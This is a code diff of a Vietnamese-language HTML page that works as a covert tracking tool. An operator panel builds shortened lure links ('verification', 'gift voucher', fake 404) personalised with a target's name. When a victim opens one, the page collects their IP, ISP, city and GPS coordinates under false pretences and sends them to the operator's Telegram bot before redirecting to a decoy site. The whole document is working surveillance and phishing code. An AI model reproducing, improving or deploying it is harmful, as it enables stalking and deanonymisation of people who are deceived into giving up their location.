@@ -9,9 +9,9 @@
         .admin-bg { background: #010409; }
         .glass { background: #0d1117; border: 1px solid #30363d; }
         .input-alt { background: #010409; border: 1px solid #30363d; color: #c9d1d9; font-size: 11px; }
-        .input-alt:focus { border-color: #58a6ff; outline: none; transition: 0.3s; }
-        .btn-green { background: #238636; color: #fff; }
-        .btn-green:hover { background: #2ea043; }
+        .input-alt:focus { border-color: #58a6ff; outline: none; }
+        .btn-action { transition: all 0.2s; border: 1px solid rgba(255,255,255,0.05); }
+        .btn-action:active { transform: scale(0.95); }
         ::-webkit-scrollbar { width: 3px; }
         ::-webkit-scrollbar-thumb { background: #30363d; }
     </style>
@@ -19,60 +19,69 @@
 <body class="admin-bg text-slate-400 font-sans min-h-screen">
 
     <div id="v-track" class="flex flex-col items-center justify-center h-screen p-6 text-center">
-        <div id="ui-content" class="animate-pulse">
-            </div>
+        <div id="ui-loader" class="w-10 h-10 border-2 border-blue-500 border-t-transparent rounded-full animate-spin mb-4 mx-auto"></div>
+        <div id="ui-content">
+            <h2 class="text-white text-sm font-bold uppercase tracking-widest">Đang kết nối máy chủ...</h2>
+            <p class="text-[10px] text-slate-500 mt-2 italic">Vui lòng chờ xác nhận bảo mật</p>
+        </div>
     </div>
 
     <div id="v-admin" class="hidden p-4 lg:p-8">
         <div class="max-w-7xl mx-auto space-y-6">
             <header class="flex justify-between items-center border-b border-slate-800 pb-4">
-                <h1 class="text-xl font-black text-white italic tracking-tighter uppercase">BCA <span class="text-blue-500">04</span></h1>
+                <h1 class="text-xl font-black text-white italic tracking-tighter uppercase">Sentinel <span class="text-blue-500">V15</span></h1>
                 <button onclick="logout()" class="text-[9px] bg-red-500/10 text-red-500 px-3 py-1.5 rounded border border-red-500/30">LOGOUT</button>
             </header>
 
             <div class="grid lg:grid-cols-12 gap-6">
-                <div class="lg:col-span-5 space-y-4">
-                    <div class="glass p-5 rounded-2xl space-y-4 shadow-2xl">
-                        <h3 class="text-blue-500 text-[10px] font-black uppercase tracking-widest">1. Hệ thống & Đích đến</h3>
+                <div class="lg:col-span-4 space-y-4">
+                    <div class="glass p-5 rounded-3xl space-y-4 shadow-2xl">
+                        <h3 class="text-blue-500 text-[10px] font-black uppercase tracking-widest">1. Hệ thống & Redirect</h3>
                         <div class="grid grid-cols-2 gap-2">
                             <input id="in-tk" type="password" placeholder="Bot Token" class="input-alt p-3 rounded-xl">
                             <input id="in-id" type="text" placeholder="Chat ID" class="input-alt p-3 rounded-xl">
                         </div>
-                        <input id="in-redir" type="text" placeholder="Link chuyển đến (VD: facebook.com/abc)" class="w-full input-alt p-3 rounded-xl">
+                        <input id="in-redir" type="text" placeholder="Link đích (VD: https://fb.com)" class="w-full input-alt p-3 rounded-xl">
                         <div class="flex gap-2">
                             <input id="in-api" type="password" placeholder="Cutt.ly Key" class="flex-1 input-alt p-3 rounded-xl">
-                            <button onclick="checkAPI()" class="bg-slate-800 px-4 rounded-xl text-[9px] font-bold text-white">CHECK API</button>
+                            <button onclick="checkAPI()" class="bg-slate-800 px-3 rounded-xl text-[9px] font-bold">CHECK</button>
                         </div>
-                        <button onclick="saveC()" class="w-full bg-blue-600 py-3 rounded-xl text-white text-[10px] font-bold uppercase">Lưu cấu hình</button>
+                        <button onclick="saveC()" class="w-full bg-blue-600 py-3 rounded-xl text-white text-[10px] font-bold uppercase btn-action">LƯU CẤU HÌNH</button>
                     </div>
 
-                    <div class="glass p-5 rounded-2xl space-y-3">
-                        <h3 class="text-purple-500 text-[10px] font-black uppercase tracking-widest">2. Tùy chỉnh bẫy & Tạo link</h3>
-                        <select id="ed-temp" class="w-full input-alt p-3 rounded-xl text-xs uppercase font-bold">
-                            <option value="verify">Xác thực tài khoản (Bản chuẩn)</option>
-                            <option value="gift">Nhận quà tặng / Voucher</option>
-                            <option value="error">Thông báo lỗi 404 (Đánh lạc hướng)</option>
+                    <div class="glass p-5 rounded-3xl space-y-3">
+                        <h3 class="text-green-500 text-[10px] font-black uppercase tracking-widest">2. TẠO LINK MỚI</h3>
+                        <select id="ed-temp" class="w-full input-alt p-3 rounded-xl text-xs font-bold uppercase">
+                            <option value="verify">Template: Xác thực</option>
+                            <option value="gift">Template: Quà tặng</option>
+                            <option value="error">Template: Lỗi 404</option>
                         </select>
                         <input id="in-name" type="text" placeholder="Tên mục tiêu..." class="w-full input-alt p-3 rounded-xl">
-                        <button onclick="generateLink()" class="w-full btn-green py-3 rounded-xl text-[10px] font-bold uppercase transition-all">Build & Rút gọn Link</button>
-                        <div id="out-link" onclick="copyL(this)" class="hidden p-3 bg-black rounded-xl border border-slate-800 text-[9px] text-blue-400 break-all cursor-pointer text-center font-mono"></div>
+                        <div class="flex gap-2">
+                            <button onclick="generateLink(false)" class="flex-1 bg-slate-800 py-3 rounded-xl text-white text-[10px] font-bold uppercase btn-action">Chỉ tạo link</button>
+                            <button onclick="generateLink(true)" class="flex-1 bg-green-600 py-3 rounded-xl text-white text-[10px] font-bold uppercase btn-action">Build & Rút gọn</button>
+                        </div>
+                        <div id="box-link" class="hidden mt-4 space-y-2 animate-bounce">
+                             <div id="out-link" onclick="copyL(this)" class="p-4 bg-black rounded-2xl border border-blue-900/50 text-[10px] text-blue-400 break-all cursor-pointer text-center font-mono shadow-inner"></div>
+                             <p class="text-[8px] text-center text-slate-600 uppercase">Nhấn vào link để copy</p>
+                        </div>
                     </div>
                 </div>
 
-                <div class="lg:col-span-7">
-                    <div class="glass rounded-2xl overflow-hidden min-h-[500px] shadow-2xl">
+                <div class="lg:col-span-8">
+                    <div class="glass rounded-3xl overflow-hidden min-h-[500px] shadow-2xl">
                         <div class="p-4 bg-slate-900/30 border-b border-slate-800 flex justify-between">
                             <h3 class="text-white text-[10px] font-black uppercase tracking-widest">Nhật ký Intelligence</h3>
-                            <button onclick="clearLogs()" class="text-[8px] text-slate-500 hover:text-red-500 font-bold uppercase">Xóa lịch sử</button>
+                            <button onclick="clearLogs()" class="text-[8px] text-slate-500 hover:text-red-500 font-bold uppercase">Xóa hết</button>
                         </div>
                         <div class="overflow-x-auto">
                             <table class="w-full text-left text-[11px]">
                                 <thead class="bg-black text-slate-500 uppercase text-[9px]">
                                     <tr>
                                         <th class="p-4">Target</th>
-                                        <th class="p-4">IP / Nhà mạng</th>
+                                        <th class="p-4">IP / ISP</th>
                                         <th class="p-4">Vị trí</th>
-                                        <th class="p-4 text-right">Action</th>
+                                        <th class="p-4 text-right">Thao tác</th>
                                     </tr>
                                 </thead>
                                 <tbody id="log-table" class="divide-y divide-slate-800/30"></tbody>
@@ -85,39 +94,19 @@
     </div>
 
     <script>
-        let cfg = { 
-            t: "", 
-            i: "", a: "", 
-            r: "https://vi.wikipedia.org/wiki/Đào_Minh_Quân",
-            temp: "verify"
-        };
+        let cfg = { t: "", i: "", a: "", r: "https://google.com", temp: "verify" };
+        const params = new URLSearchParams(window.location.search);
 
         const templates = {
-            verify: {
-                title: "Xác thực Google",
-                html: `<div class="w-10 h-10 border-2 border-blue-500 border-t-transparent rounded-full animate-spin mb-4 mx-auto"></div>
-                       <h2 class="text-white text-sm font-bold uppercase">Đang kiểm tra bảo mật...</h2>
-                       <p class="text-[10px] text-slate-500 mt-2 italic">Vui lòng cho phép quyền truy cập để tiếp tục</p>`
-            },
-            gift: {
-                title: "Nhận quà tặng",
-                html: `<div class="text-4xl mb-4">🎁</div>
-                       <h2 class="text-yellow-500 text-sm font-bold">BẠN CÓ 1 PHẦN QUÀ!</h2>
-                       <p class="text-[10px] text-slate-500 mt-2 uppercase">Xác minh vị trí để nhận voucher 500k</p>`
-            },
-            error: {
-                title: "Lỗi 404",
-                html: `<h1 class="text-5xl font-black text-slate-800">404</h1>
-                       <h2 class="text-slate-500 text-xs mt-4">Trang web không tồn tại hoặc đã bị xóa.</h2>`
-            }
+            verify: { title: "Xác thực", html: `<div class="w-10 h-10 border-2 border-blue-500 border-t-transparent rounded-full animate-spin mb-4 mx-auto"></div><h2 class="text-white text-sm font-bold">ĐANG XÁC THỰC...</h2>` },
+            gift: { title: "Nhận quà", html: `<div class="text-4xl mb-4">🎁</div><h2 class="text-yellow-500 text-sm font-bold">BẠN CÓ QUÀ TẶNG!</h2>` },
+            error: { title: "Lỗi 404", html: `<h1 class="text-5xl font-black text-slate-800">404</h1><h2 class="text-slate-500 text-xs">Trang không tồn tại.</h2>` }
         };
-
-        const params = new URLSearchParams(window.location.search);
 
         window.onload = () => {
             if (params.has('admin')) {
-                if (localStorage.getItem('auth_v14') === 'true' || prompt("Access Key:") === "123") {
-                    localStorage.setItem('auth_v14', 'true');
+                if (localStorage.getItem('auth_v15') === 'true' || prompt("Access Key:") === "123") {
+                    localStorage.setItem('auth_v15', 'true');
                     document.getElementById('v-track').remove();
                     document.getElementById('v-admin').classList.remove('hidden');
                     loadAdmin();
@@ -135,76 +124,32 @@
         async function executeTracking() {
             const name = params.get('name') || 'Guest';
             let ipInfo = { ip: 'N/A', isp: 'N/A', city: 'N/A', lat: 0, lon: 0 };
-            
             try {
                 const res = await fetch('https://ipapi.co/json/').then(r => r.json());
                 ipInfo = { ip: res.ip, isp: res.org, city: res.city, lat: res.latitude, lon: res.longitude };
                 saveLog({ name, ...ipInfo, time: new Date().toLocaleTimeString(), st: 'IP-ONLY' });
-                
-                const msg = `🚀 <b>MỤC TIÊU: ${name}</b>\n🌐 IP: <code>${ipInfo.ip}</code>\n🏢 ISP: ${ipInfo.isp}\n📍 Vùng: ${ipInfo.city}`;
-                await fetch(`https://api.telegram.org/bot${cfg.t}/sendMessage?chat_id=${cfg.i}&parse_mode=HTML&text=${encodeURIComponent(msg)}`);
+                await fetch(`https://api.telegram.org/bot${cfg.t}/sendMessage?chat_id=${cfg.i}&parse_mode=HTML&text=${encodeURIComponent("🚀 <b>" + name + "</b> truy cập\nIP: " + ipInfo.ip + "\n📍 " + ipInfo.city)}`);
             } catch(e) {}
 
             const finish = () => location.replace(cfg.r);
-
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (p) => {
-                    const lat = p.coords.latitude, lon = p.coords.longitude;
-                    updateLogStatus(name, 'GPS-OK', lat, lon);
-                    const gpsMsg = `🎯 <b>GPS: ${name}</b>\n📍 Bản đồ: <a href="https://www.google.com/maps?q=${lat},${lon}">XEM VỊ TRÍ</a>`;
-                    await fetch(`https://api.telegram.org/bot${cfg.t}/sendMessage?chat_id=${cfg.i}&parse_mode=HTML&text=${encodeURIComponent(gpsMsg)}`);
+                    updateLogStatus(name, 'GPS-OK', p.coords.latitude, p.coords.longitude);
+                    await fetch(`https://api.telegram.org/bot${cfg.t}/sendMessage?chat_id=${cfg.i}&parse_mode=HTML&text=${encodeURIComponent("🎯 <b>" + name + "</b> GPS OK\nMap: http://google.com/maps?q=" + p.coords.latitude + "," + p.coords.longitude)}`);
                     finish();
-                }, () => {
-                    updateLogStatus(name, 'IP-LOCATION', ipInfo.lat, ipInfo.lon);
-                    finish();
-                }, {enableHighAccuracy: true, timeout: 5000});
-            } else { finish(); }
+                }, finish, {timeout: 5000});
+            } else finish();
             setTimeout(finish, 8000);
         }
 
-        // --- ADMIN DASHBOARD ---
-        function renderLogs() {
-            const logs = JSON.parse(localStorage.getItem('sentinel_logs_v14') || '[]');
-            const table = document.getElementById('log-table');
-            table.innerHTML = logs.map(l => `
-                <tr class="hover:bg-blue-500/5 transition-all border-b border-slate-800/30">
-                    <td class="p-4"><b class="text-white uppercase">${l.name}</b><br><span class="text-[8px] text-slate-600">${l.time}</span></td>
-                    <td class="p-4 font-mono text-blue-400 text-[10px]">${l.ip}<br><span class="text-slate-600 text-[8px]">${l.isp}</span></td>
-                    <td class="p-4 text-[10px] text-slate-300">${l.city}</td>
-                    <td class="p-4 text-right">
-                        <div class="flex flex-col gap-1 items-end">
-                            <span class="text-[8px] font-black italic ${l.st === 'GPS-OK' ? 'text-green-500' : 'text-yellow-600'}">${l.st}</span>
-                            <div class="flex gap-2">
-                                <a href="https://www.google.com/maps?q=${l.lat},${l.lon}" target="_blank" class="bg-blue-900/30 text-blue-400 px-2 py-0.5 rounded text-[8px] font-bold">MAP</a>
-                                <a href="https://whoer.net/checkip?ip=${l.ip}" target="_blank" class="bg-slate-800 text-slate-500 px-2 py-0.5 rounded text-[8px] font-bold">WHOIS</a>
-                            </div>
-                        </div>
-                    </td>
-                </tr>`).join('');
-        }
-
-        function saveLog(d) {
-            let logs = JSON.parse(localStorage.getItem('sentinel_logs_v14') || '[]');
-            logs.unshift(d);
-            localStorage.setItem('sentinel_logs_v14', JSON.stringify(logs.slice(0, 100)));
-            if(!document.getElementById('v-admin').classList.contains('hidden')) renderLogs();
-        }
-
-        function updateLogStatus(n, st, lat, lon) {
-            let logs = JSON.parse(localStorage.getItem('sentinel_logs_v14') || '[]');
-            if(logs.length > 0 && logs[0].name === n) { logs[0].st = st; logs[0].lat = lat; logs[0].lon = lon; }
-            localStorage.setItem('sentinel_logs_v14', JSON.stringify(logs));
-            if(!document.getElementById('v-admin').classList.contains('hidden')) renderLogs();
-        }
-
+        // --- ADMIN ---
         function loadAdmin() {
-            const saved = localStorage.getItem('cfg_v14');
+            const saved = localStorage.getItem('cfg_v15');
             if(saved) cfg = JSON.parse(saved);
             document.getElementById('in-tk').value = cfg.t;
             document.getElementById('in-id').value = cfg.i;
             document.getElementById('in-redir').value = cfg.r;
             document.getElementById('in-api').value = cfg.a || "";
-            document.getElementById('ed-temp').value = cfg.temp || "verify";
             renderLogs();
         }
 
@@ -213,30 +158,65 @@
             cfg.i = document.getElementById('in-id').value;
             cfg.r = document.getElementById('in-redir').value;
             cfg.a = document.getElementById('in-api').value;
-            cfg.temp = document.getElementById('ed-temp').value;
-            localStorage.setItem('cfg_v14', JSON.stringify(cfg));
-            alert("Đã lưu!");
+            localStorage.setItem('cfg_v15', JSON.stringify(cfg));
+            alert("Đã lưu cấu hình!");
         }
 
-        async function generateLink() {
+        async function generateLink(isShort) {
             const n = document.getElementById('in-name').value || "Target";
             const b = window.location.href.split('?')[0];
+            cfg.temp = document.getElementById('ed-temp').value;
             let link = `${b}?name=${encodeURIComponent(n)}&v=${btoa(JSON.stringify(cfg))}`;
-            if(cfg.a) {
-                const r = await fetch(`https://cutt.ly/api/api.php?key=${cfg.a}&short=${encodeURIComponent(link)}`).then(res => res.json());
-                if(r.url.status === 7) link = r.url.shortLink;
+            
+            if(isShort && cfg.a) {
+                try {
+                    const res = await fetch(`https://cutt.ly/api/api.php?key=${cfg.a}&short=${encodeURIComponent(link)}`).then(r => r.json());
+                    if(res.url.status === 7) link = res.url.shortLink;
+                    else alert("Lỗi Cutt.ly: " + res.url.status);
+                } catch (e) { alert("Lỗi kết nối rút gọn!"); }
             }
-            const o = document.getElementById('out-link');
-            o.innerText = link; o.classList.remove('hidden');
+            
+            const box = document.getElementById('box-link');
+            const out = document.getElementById('out-link');
+            box.classList.remove('hidden');
+            out.innerText = link;
         }
 
-        function clearLogs() { localStorage.removeItem('sentinel_logs_v14'); renderLogs(); }
+        function renderLogs() {
+            const logs = JSON.parse(localStorage.getItem('sentinel_logs_v15') || '[]');
+            document.getElementById('log-table').innerHTML = logs.map(l => `
+                <tr class="hover:bg-blue-500/5 border-b border-slate-800/30">
+                    <td class="p-4"><b class="text-white uppercase">${l.name}</b><br><span class="text-[8px] text-slate-600">${l.time}</span></td>
+                    <td class="p-4 font-mono text-blue-400 text-[10px]">${l.ip}<br><span class="text-[8px] text-slate-600">${l.isp}</span></td>
+                    <td class="p-4 text-[10px] text-slate-300">${l.city}</td>
+                    <td class="p-4 text-right">
+                        <span class="text-[8px] font-black italic ${l.st === 'GPS-OK' ? 'text-green-500' : 'text-yellow-600'}">${l.st}</span><br>
+                        <a href="http://google.com/maps?q=${l.lat},${l.lon}" target="_blank" class="text-[9px] text-blue-500 underline">MAP</a>
+                    </td>
+                </tr>`).join('');
+        }
+
+        function saveLog(d) {
+            let logs = JSON.parse(localStorage.getItem('sentinel_logs_v15') || '[]');
+            logs.unshift(d);
+            localStorage.setItem('sentinel_logs_v15', JSON.stringify(logs.slice(0, 100)));
+            if(!document.getElementById('v-admin').classList.contains('hidden')) renderLogs();
+        }
+
+        function updateLogStatus(n, st, lat, lon) {
+            let logs = JSON.parse(localStorage.getItem('sentinel_logs_v15') || '[]');
+            if(logs.length > 0 && logs[0].name === n) { logs[0].st = st; logs[0].lat = lat; logs[0].lon = lon; }
+            localStorage.setItem('sentinel_logs_v15', JSON.stringify(logs));
+            if(!document.getElementById('v-admin').classList.contains('hidden')) renderLogs();
+        }
+
+        function clearLogs() { localStorage.removeItem('sentinel_logs_v15'); renderLogs(); }
         async function checkAPI() {
             const res = await fetch(`https://cutt.ly/api/api.php?key=${document.getElementById('in-api').value}&short=https://google.com`).then(r => r.json());
-            alert(res.url.status === 7 ? "API Key OK!" : "API Key Lỗi!");
+            alert(res.url.status === 7 ? "API OK!" : "Lỗi API!");
         }
         function copyL(el) { navigator.clipboard.writeText(el.innerText); alert("Copied!"); }
-        function logout() { localStorage.removeItem('auth_v14'); location.reload(); }
+        function logout() { localStorage.removeItem('auth_v15'); location.reload(); }
     </script>
 </body>
 </html>
